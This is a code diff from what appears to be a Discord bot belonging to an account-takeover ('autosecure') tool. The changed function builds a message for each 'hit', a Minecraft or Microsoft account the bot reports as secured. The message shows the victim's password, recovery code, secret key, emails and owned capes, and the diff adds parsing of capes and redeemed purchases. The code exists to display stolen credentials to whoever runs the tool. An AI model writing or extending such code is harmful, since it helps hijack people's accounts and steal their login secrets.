@@ -229,18 +229,53 @@ async function sendclaimownerembed(client, currentPage) {
 
       const securedAgo = `${days}d ${hours}h ${minutes}m`;
 
+      let parsedCapes = [];
+      if (Array.isArray(hit.acc.capes)) {
+        parsedCapes = hit.acc.capes;
+      } else if (typeof hit.acc.capes === "string" && hit.acc.capes.trim()) {
+        try {
+          const parsed = JSON.parse(hit.acc.capes);
+          if (Array.isArray(parsed)) parsedCapes = parsed;
+          else if (parsed) parsedCapes = [String(parsed)];
+        } catch {
+          parsedCapes = hit.acc.capes.split(",").map(c => c.trim()).filter(Boolean);
+        }
+      }
+      const capesDisplay = parsedCapes.length > 0 ? parsedCapes.join(", ") : "None";
+
+      let redeemedCapesDisplay = "None";
+      try {
+        const extraRows = await client.queryParams("SELECT purchases FROM extrainformation WHERE uid = ?", [hit.uid]);
+        if (extraRows && extraRows.length > 0 && extraRows[0]?.purchases) {
+          const { parsePurchases } = require("../../autosecure/utils/info/parsePurchases");
+          const { redeemedCapes } = parsePurchases(extraRows[0].purchases);
+          if (redeemedCapes && redeemedCapes.length > 0) {
+            redeemedCapesDisplay = redeemedCapes.join(", ");
+          }
+        }
+      } catch (e) {}
+
+      const hitFields = [
+        { name: "Username", value: `\`\`\`${hit.acc.oldName}\`\`\``, inline: true },
+        { name: "Owns MC", value: `\`\`\`${formatOwnedGames(hit.acc)}\`\`\``, inline: true },
+        { name: "Capes (Java)", value: `\`\`\`${capesDisplay}\`\`\``, inline: true },
+      ];
+
+      if (redeemedCapesDisplay !== "None") {
+        hitFields.push({ name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesDisplay}\`\`\``, inline: true });
+      }
+
+      hitFields.push(
+        { name: "Recovery Code", value: `\`\`\`${hit.acc.recoveryCode}\`\`\``, inline: false },
+        { name: "Primary Email", value: `\`\`\`${hit.acc.email}\`\`\``, inline: true },
+        { name: "Security Email", value: `\`\`\`${hit.acc.secEmail}\`\`\``, inline: true },
+        { name: "Secret Key", value: `\`\`\`${hit.acc.secretkey}\`\`\``, inline: true },
+        { name: "Password", value: `\`\`\`${hit.acc.password}\`\`\``, inline: false }
+      );
+
       const embedBuilder = new EmbedBuilder()
         .setColor(0xb2c7e0)
-        .setFields([
-          { name: "Username", value: `\`\`\`${hit.acc.oldName}\`\`\``, inline: true },
-          { name: "Owns MC", value: `\`\`\`${formatOwnedGames(hit.acc)}\`\`\``, inline: true },
-          { name: "Capes", value: "```" + (Array.isArray(hit.acc.capes) && hit.acc.capes.length > 0 ? hit.acc.capes.join(", ") : "None") + "```", inline: true },
-          { name: "Recovery Code", value: `\`\`\`${hit.acc.recoveryCode}\`\`\``, inline: false },
-          { name: "Primary Email", value: `\`\`\`${hit.acc.email}\`\`\``, inline: true },
-          { name: "Security Email", value: `\`\`\`${hit.acc.secEmail}\`\`\``, inline: true },
-          { name: "Secret Key", value: `\`\`\`${hit.acc.secretkey}\`\`\``, inline: true },
-          { name: "Password", value: `\`\`\`${hit.acc.password}\`\`\``, inline: false },
-        ])
+        .setFields(hitFields)
         .setTitle(`Account secured in ${hit.acc.timeTaken ? Math.round(hit.acc.timeTaken) : "Unknown"} seconds`)
         .setFooter({ text: `Secured ago: ${securedAgo}` });
 
